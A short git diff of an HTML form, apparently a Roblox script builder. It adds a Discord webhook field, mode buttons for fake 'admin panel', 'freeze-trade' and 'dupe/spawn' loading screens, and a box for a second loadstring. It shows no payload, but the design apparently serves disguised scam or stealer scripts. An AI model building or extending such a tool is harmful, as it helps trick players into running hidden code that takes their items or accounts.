@@ -27,14 +27,19 @@
             <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." />
         </section>
 
+        <!-- ===== EXECUTION MODE (5 BOTONES) ===== -->
         <section class="mode-section">
             <span class="mode-label">EXECUTION MODE</span>
             <div class="mode-buttons">
-                <button id="modeNormal" class="mode-btn active">NORMAL</button>
-                <button id="modeCustom" class="mode-btn">CUSTOM</button>
+                <button class="mode-btn active" data-mode="normal">NORMAL</button>
+                <button class="mode-btn" data-mode="adminpanel">GUI LOADING ADMIN PANEL</button>
+                <button class="mode-btn" data-mode="freezetrade">GUI LOADING FREEZE-TRADE</button>
+                <button class="mode-btn" data-mode="dupespawn">GUI LOADING DUPE/SPAWN</button>
+                <button class="mode-btn" data-mode="custom">CUSTOM</button>
             </div>
         </section>
 
+        <!-- Second Loadstring (se muestra solo si el modo no es NORMAL) -->
         <section id="secondLoadstring" class="hidden">
             <label>SECOND LOADSTRING</label>
             <textarea id="customLoadstring" rows="4" placeholder="Escribe tu código aquí..."></textarea>
